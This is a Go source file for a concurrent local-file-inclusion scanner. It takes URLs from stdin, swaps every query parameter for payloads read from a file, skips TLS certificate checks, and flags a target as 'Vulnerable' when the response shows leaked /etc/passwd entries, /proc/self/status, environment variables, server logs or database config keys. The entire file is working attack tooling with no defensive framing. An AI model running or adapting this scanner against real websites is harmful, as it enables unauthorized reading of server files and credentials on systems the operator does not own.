package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"time"
)

func main() {
	var payloadFile string
	flag.StringVar(&payloadFile, "p", "", "Payload file")

	var concurrencyLimit int
	flag.IntVar(&concurrencyLimit, "c", 10, "Concurrency limit")

	flag.Parse()

	// Read payloads from file
	payloads, err := readLines(payloadFile)

	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to read payload file %s [%s]\n", payloadFile, err)
		return
	}
	var client = &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Read URLs from stdin

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, concurrencyLimit)
	sc := bufio.NewScanner(os.Stdin)

	// Initialize the progress bar

	// Reset the scanner

	for sc.Scan() {
		stdurl := sc.Text()
		u, err := url.Parse(stdurl)
		if err != nil {
			fmt.Fprintf(os.Stderr, "failed to parse url %s [%s]\n", stdurl, err)
			continue
		}

		// Go's maps aren't ordered, but we want to use all the param names
		// as part of the key to output only unique requests. To do that, put
		// them into a slice and then sort it.
		pp := make([]string, 0)
		for p, _ := range u.Query() {
			pp = append(pp, p)
		}
		sort.Strings(pp)

		// Replace each parameter with each payload
		for _, payload := range payloads {
			newURL, err := ReplaceQueryParamsWithPayload(stdurl, payload, false)
			if err != nil {
				continue
			}
			semaphore <- struct{}{}
			wg.Add(1)
			go func(u string) {
				defer func() {
					wg.Done()
					<-semaphore
				}()

				if checkLFI(u, client) {
					fmt.Printf("[+] Vulnerable: %s\n", u)
				}
			}(newURL)
		}

	}

	wg.Wait()

	// Finish the progress bar
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func ReplaceQueryParamsWithPayload(urlStr string, payload string, appendMode bool) (string, error) {
	u, err := url.Parse(urlStr)
	if err != nil {
		return "", err
	}

	qs := u.Query()
	for param := range qs {
		if appendMode {
			qs.Set(param, qs.Get(param)+payload)
		} else {
			qs.Set(param, payload)
		}
	}

	u.RawQuery = qs.Encode()
	return u.String(), nil
}

func checkLFI(u string, client *http.Client) bool {
	req, err := http.NewRequest(http.MethodGet, u, nil)
	if err != nil {
		return false
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	content, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	if !strings.Contains(string(content), "<a href='function.main'>function.main</a>") &&
		!strings.Contains(string(content), "<a href='function.include'>function.include</a>") &&
		!strings.Contains(string(content), "Failed opening") &&
		!strings.Contains(string(content), "for inclusion") &&
		!strings.Contains(string(content), "failed to open stream:") &&
		!strings.Contains(string(content), "open_basedir restriction in effect") &&
		(strings.Contains(string(content), "root:") || (strings.Contains(string(content), "sbin") && strings.Contains(string(content), "nologin")) ||
			strings.Contains(string(content), "DB_NAME") || strings.Contains(string(content), "daemon:") || strings.Contains(string(content), "DOCUMENT_ROOT=") ||
			strings.Contains(string(content), "PATH=") || strings.Contains(string(content), "HTTP_USER_AGENT") || strings.Contains(string(content), "HTTP_ACCEPT_ENCODING=") ||
			strings.Contains(string(content), "users:x") || (strings.Contains(string(content), "GET /") && (strings.Contains(string(content), "HTTP/1.1") || strings.Contains(string(content), "HTTP/1.0"))) ||
			strings.Contains(string(content), "apache_port=") || strings.Contains(string(content), "cpanel/logs/access") || strings.Contains(string(content), "allow_login_autocomplete") ||
			strings.Contains(string(content), "database_prefix=") || strings.Contains(string(content), "emailusersbandwidth") || strings.Contains(string(content), "adminuser=") ||
			(strings.Contains(string(content), "[error]") && strings.Contains(string(content), "[client]") && strings.Contains(string(content), "log")) ||
			(strings.Contains(string(content), "[error] [client") && strings.Contains(string(content), "File does not exist:") && strings.Contains(string(content), "proc/self/fd/")) ||
			(strings.Contains(string(content), "State: R (running)") && (strings.Contains(string(content), "Tgid:") || strings.Contains(string(content), "TracerPid:") || strings.Contains(string(content), "Uid:")) && strings.Contains(string(content), "/proc/self/status"))) {
		return true
	}

	return false
}
